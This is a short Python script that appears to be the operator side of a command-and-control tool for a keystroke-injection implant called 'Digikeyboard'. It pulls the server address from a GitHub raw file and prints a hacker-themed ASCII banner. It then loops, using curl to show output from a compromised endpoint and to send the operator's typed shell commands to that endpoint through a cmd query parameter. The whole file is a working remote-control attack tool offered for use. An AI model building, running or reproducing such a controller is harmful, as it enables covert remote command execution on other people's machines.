import os
import time
from urllib.parse import quote
import urllib.request 
github_url = "https://raw.githubusercontent.com/Kaiden-cyber/Digikeyboard-v2/refs/heads/main/site-url"
with urllib.request.urlopen(github_url) as response: 
    url = response.read().decode("utf-8").replace('\n', '')
text = ""

ascii_art = ''' 
                    ____     ____
                  /'    |   |    \ 
                /    /  |   | \   \ 
              /    / |  |   |  \   \ 
             (   /   |  """"   |\   \   
             | /   / /^\    /^\  \  _|
              ~   | |   |  |   | | ~
                  | |__O|__|O__| |
                /~~      \/     ~~\ 
               /   (      |      )  \ 
               /,   \____/^\___/'   \ 
                / -____-|_|_|-____-\ 
           _____|_/~~~~\____/~~~~\__|_____
          |____|_|     |____|     |__|____|
              | `^-^-^'    `^-^-^'    |
              |                       |    Program Created By:
              |     "Silly Rabbit,    |  github.com/Kaiden-cyber
              |                       |
              |  Root is for admins!" |
              |                       |
              |                       |
              |                       |
              |                       |
               -----------------------'''
print(ascii_art)
while text.lower() != "quit":
    print("Latest Output from endpoint:")
    os.system(f"curl {url}/903695081637dd0202da4c3d5a0800f3")
    print()
    text = input("Enter the command you want to send to the endpoint(quit to exit program): ")
    if text.lower() != "quit":
        os.system(f"curl {url}/86e8fc0c3eb4660fbfdc849a844cd54/?cmd={quote(str(text))}")
        print("please give ~3s for the data to be recieved")
        time.sleep(3)